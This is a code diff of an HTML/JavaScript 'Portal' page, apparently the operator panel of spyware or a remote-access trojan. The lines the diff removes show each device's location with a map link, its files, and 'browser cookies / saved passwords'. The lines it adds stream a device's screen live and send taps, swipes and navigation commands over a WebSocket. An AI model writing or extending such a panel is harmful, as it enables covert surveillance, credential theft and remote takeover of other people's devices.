@@ -6,132 +6,149 @@
 <title>Portal</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;height:100vh;overflow:hidden}
-#sidebar{width:220px;background:#111;border-right:1px solid #222;padding:12px;overflow-y:auto;flex-shrink:0}
-#sidebar h2{font-size:11px;color:#555;margin-bottom:10px;letter-spacing:.1em}
-.dev-entry{padding:8px;border-radius:4px;cursor:pointer;margin-bottom:6px;background:#1a1a1a;border:1px solid #222;font-size:11px}
+body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;flex-direction:column;height:100vh;overflow:hidden}
+#top{display:flex;flex:1;overflow:hidden}
+#sidebar{width:180px;background:#111;border-right:1px solid #222;padding:10px;overflow-y:auto;flex-shrink:0}
+#sidebar h2{font-size:10px;color:#555;margin-bottom:8px}
+.dev-entry{padding:7px;border-radius:4px;cursor:pointer;margin-bottom:5px;background:#1a1a1a;border:1px solid #222;font-size:10px}
 .dev-entry.active{border-color:#4af;background:#112}
 .dev-entry .model{color:#ccc;font-weight:bold}
-.dev-entry .id{color:#444;font-size:9px;word-break:break-all;margin-top:2px}
-#right{flex:1;display:flex;flex-direction:column;overflow:hidden}
-#tabs{display:flex;background:#111;border-bottom:1px solid #222;flex-shrink:0}
-.tab{padding:8px 16px;cursor:pointer;font-size:11px;color:#555;border-right:1px solid #222}
-.tab.active{color:#4af;background:#0a0a0a}
-#panels{flex:1;overflow:hidden;position:relative}
-.panel{display:none;width:100%;height:100%;overflow:auto;padding:12px}
-.panel.active{display:block}
-#screenPanel{display:none;width:100%;height:100%;align-items:center;justify-content:center;background:#050505}
-#screenPanel.active{display:flex}
-#screen{max-width:100%;max-height:100%}
-#status{position:fixed;top:6px;right:12px;font-size:10px;color:#444}
-pre{font-size:10px;white-space:pre-wrap;word-break:break-all;color:#8f8}
-.section{margin-bottom:16px}
-.section h3{font-size:10px;color:#4af;margin-bottom:6px;letter-spacing:.1em}
-table{width:100%;border-collapse:collapse;font-size:10px}
-td{padding:4px 6px;border-bottom:1px solid #1a1a1a;vertical-align:top}
-td:first-child{color:#888;width:140px;flex-shrink:0}
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+#screenWrap{flex:1;display:flex;align-items:center;justify-content:center;background:#050505;position:relative;overflow:hidden}
+#screen{max-width:100%;max-height:100%;display:block;cursor:crosshair}
+#empty{color:#222;font-size:12px}
+#controls{background:#111;border-top:1px solid #222;padding:8px;display:flex;gap:6px;flex-wrap:wrap;justify-content:center;flex-shrink:0}
+.btn{background:#1a1a1a;border:1px solid #333;color:#ccc;padding:6px 14px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px}
+.btn:active{background:#223;border-color:#4af}
+#status{font-size:9px;color:#444;text-align:center;padding:3px}
+#swipeHint{position:absolute;top:6px;left:6px;font-size:9px;color:#333;pointer-events:none}
 </style>
 </head>
 <body>
-<div id="sidebar">
-  <h2>DEVICES</h2>
-  <div id="devList"></div>
-</div>
-<div id="right">
-  <div id="tabs">
-    <div class="tab active" onclick="switchTab('screen')">Screen</div>
-    <div class="tab" onclick="switchTab('location')">Location</div>
-    <div class="tab" onclick="switchTab('files')">Files</div>
-    <div class="tab" onclick="switchTab('cookies')">Cookies</div>
-    <div class="tab" onclick="switchTab('info')">Info</div>
+<div id="top">
+  <div id="sidebar">
+    <h2>DEVICES</h2>
+    <div id="devList"></div>
   </div>
-  <div id="panels">
-    <div id="screenPanel" class="panel active"><img id="screen" style="display:none"><span id="empty" style="color:#222;font-size:13px">no device selected</span></div>
-    <div id="locationPanel" class="panel"><div class="section"><h3>LOCATION</h3><div id="locationData" style="color:#666;font-size:11px">no data yet</div></div></div>
-    <div id="filesPanel" class="panel"><div class="section"><h3>FILES</h3><div id="filesData" style="color:#666;font-size:11px">no data yet</div></div></div>
-    <div id="cookiesPanel" class="panel"><div class="section"><h3>BROWSER COOKIES / SAVED PASSWORDS</h3><div id="cookiesData" style="color:#666;font-size:11px">no data yet</div></div></div>
-    <div id="infoPanel" class="panel"><div class="section"><h3>DEVICE INFO</h3><table id="infoTable"></table></div></div>
+  <div id="main">
+    <div id="screenWrap">
+      <img id="screen" style="display:none">
+      <div id="empty">no device selected</div>
+      <div id="swipeHint">tap to click · drag to swipe</div>
+    </div>
+    <div id="controls">
+      <button class="btn" onclick="send({cmd:'back'})">◀ Back</button>
+      <button class="btn" onclick="send({cmd:'home'})">⬤ Home</button>
+      <button class="btn" onclick="send({cmd:'recent'})">▣ Recents</button>
+      <button class="btn" onclick="send({cmd:'notif'})">🔔 Notifs</button>
+    </div>
+    <div id="status">disconnected</div>
   </div>
 </div>
-<div id="status">disconnected</div>
 <script>
-const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-const ws = new WebSocket(`${proto}://${location.host}/portal`);
-const devList = document.getElementById('devList');
-const screen  = document.getElementById('screen');
-const empty   = document.getElementById('empty');
-const status  = document.getElementById('status');
-let activeId  = null;
+const proto  = location.protocol==='https:'?'wss':'ws';
+const ws     = new WebSocket(`${proto}://${location.host}/portal`);
+const devList= document.getElementById('devList');
+const screen = document.getElementById('screen');
+const empty  = document.getElementById('empty');
+const status = document.getElementById('status');
+let activeId = null;
+let imgW=0,imgH=0,devW=1080,devH=1920;
 
-ws.binaryType = 'blob';
-ws.onopen  = () => status.textContent = 'connected';
-ws.onclose = () => status.textContent = 'disconnected';
-
-ws.onmessage = (ev) => {
-    if (ev.data instanceof Blob) {
-        const url = URL.createObjectURL(ev.data);
-        screen.onload = () => URL.revokeObjectURL(url);
-        screen.src = url;
-        screen.style.display = 'block';
-        empty.style.display  = 'none';
-    } else {
-        const msg = JSON.parse(ev.data);
-        if (msg.type === 'device_list') renderDevices(msg.devices);
-        else if (msg.type === 'data') handleData(msg.kind, msg.payload);
-    }
+ws.binaryType='blob';
+ws.onopen=()=>status.textContent='connected';
+ws.onclose=()=>status.textContent='disconnected';
+ws.onmessage=(ev)=>{
+  if(ev.data instanceof Blob){
+    const url=URL.createObjectURL(ev.data);
+    screen.onload=()=>{
+      imgW=screen.clientWidth; imgH=screen.clientHeight;
+      URL.revokeObjectURL(url);
+    };
+    screen.src=url;
+    screen.style.display='block';
+    empty.style.display='none';
+  } else {
+    const msg=JSON.parse(ev.data);
+    if(msg.type==='device_list') renderDevices(msg.devices);
+    if(msg.type==='screen_size'){devW=msg.w;devH=msg.h;}
+  }
 };
 
-function switchTab(name) {
-    document.querySelectorAll('.tab').forEach((t,i) => {
-        const names = ['screen','location','files','cookies','info'];
-        t.classList.toggle('active', names[i] === name);
-    });
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-    document.getElementById(name+'Panel').classList.add('active');
+// ── tap and swipe ──────────────────────────────────────────────────────
+let touchStart=null;
+screen.addEventListener('mousedown', e=>{
+  const r=screen.getBoundingClientRect();
+  touchStart={x:e.clientX-r.left, y:e.clientY-r.top, t:Date.now()};
+});
+screen.addEventListener('mouseup', e=>{
+  if(!touchStart) return;
+  const r=screen.getBoundingClientRect();
+  const ex=e.clientX-r.left, ey=e.clientY-r.top;
+  const dx=ex-touchStart.x, dy=ey-touchStart.y;
+  const dist=Math.sqrt(dx*dx+dy*dy);
+  const scaleX=devW/r.width, scaleY=devH/r.height;
+  if(dist<10){
+    send({cmd:'tap',
+      x:(touchStart.x*scaleX),
+      y:(touchStart.y*scaleY)});
+  } else {
+    send({cmd:'swipe',
+      x1:touchStart.x*scaleX, y1:touchStart.y*scaleY,
+      x2:ex*scaleX, y2:ey*scaleY,
+      dur:Math.min(Date.now()-touchStart.t,1000)});
+  }
+  touchStart=null;
+});
+
+// touch support for mobile viewing
+screen.addEventListener('touchstart', e=>{
+  e.preventDefault();
+  const r=screen.getBoundingClientRect();
+  const t=e.touches[0];
+  touchStart={x:t.clientX-r.left,y:t.clientY-r.top,t:Date.now()};
+},{passive:false});
+screen.addEventListener('touchend', e=>{
+  if(!touchStart) return;
+  const r=screen.getBoundingClientRect();
+  const t=e.changedTouches[0];
+  const ex=t.clientX-r.left, ey=t.clientY-r.top;
+  const dx=ex-touchStart.x, dy=ey-touchStart.y;
+  const dist=Math.sqrt(dx*dx+dy*dy);
+  const scaleX=devW/r.width, scaleY=devH/r.height;
+  if(dist<10){
+    send({cmd:'tap',x:touchStart.x*scaleX,y:touchStart.y*scaleY});
+  } else {
+    send({cmd:'swipe',
+      x1:touchStart.x*scaleX,y1:touchStart.y*scaleY,
+      x2:ex*scaleX,y2:ey*scaleY,
+      dur:Math.min(Date.now()-touchStart.t,1000)});
+  }
+  touchStart=null;
+},{passive:false});
+
+function send(obj){ ws.send(JSON.stringify({type:'cmd',...obj})); }
+
+function renderDevices(devs){
+  devList.innerHTML='';
+  if(!devs.length){
+    devList.innerHTML='<div style="color:#333;font-size:10px">no devices</div>';
+    return;
+  }
+  devs.forEach(d=>{
+    const el=document.createElement('div');
+    el.className='dev-entry'+(d.id===activeId?' active':'');
+    el.innerHTML=`<div class="model">${d.model}</div>`;
+    el.onclick=()=>watchDevice(d.id,el);
+    devList.appendChild(el);
+  });
 }
 
-function handleData(kind, payload) {
-    if (kind === 'location') {
-        document.getElementById('locationData').innerHTML =
-            `<table>
-             <tr><td>Latitude</td><td>${payload.lat}</td></tr>
-             <tr><td>Longitude</td><td>${payload.lng}</td></tr>
-             <tr><td>Accuracy</td><td>${payload.acc}m</td></tr>
-             <tr><td>Maps</td><td><a href="https://maps.google.com/?q=${payload.lat},${payload.lng}" target="_blank" style="color:#4af">open</a></td></tr>
-             </table>`;
-    } else if (kind === 'files') {
-        document.getElementById('filesData').innerHTML =
-            '<pre>'+JSON.stringify(payload, null, 2)+'</pre>';
-    } else if (kind === 'cookies') {
-        document.getElementById('cookiesData').innerHTML =
-            '<pre>'+JSON.stringify(payload, null, 2)+'</pre>';
-    } else if (kind === 'info') {
-        const tbl = document.getElementById('infoTable');
-        tbl.innerHTML = Object.entries(payload)
-            .map(([k,v]) => `<tr><td>${k}</td><td>${v}</td></tr>`).join('');
-    }
-}
-
-function renderDevices(devs) {
-    devList.innerHTML = '';
-    if (!devs.length) {
-        devList.innerHTML = '<div style="color:#333;font-size:10px">no devices</div>';
-        return;
-    }
-    devs.forEach(d => {
-        const el = document.createElement('div');
-        el.className = 'dev-entry' + (d.id === activeId ? ' active' : '');
-        el.innerHTML = `<div class="model">${d.model}</div><div class="id">${d.id.slice(0,16)}...</div>`;
-        el.onclick = () => watchDevice(d.id, el);
-        devList.appendChild(el);
-    });
-}
-
-function watchDevice(id, el) {
-    activeId = id;
-    document.querySelectorAll('.dev-entry').forEach(e => e.classList.remove('active'));
-    el.classList.add('active');
-    ws.send(JSON.stringify({ type: 'watch', id }));
+function watchDevice(id,el){
+  activeId=id;
+  document.querySelectorAll('.dev-entry').forEach(e=>e.classList.remove('active'));
+  el.classList.add('active');
+  ws.send(JSON.stringify({type:'watch',id}));
 }
 </script>
 </body>
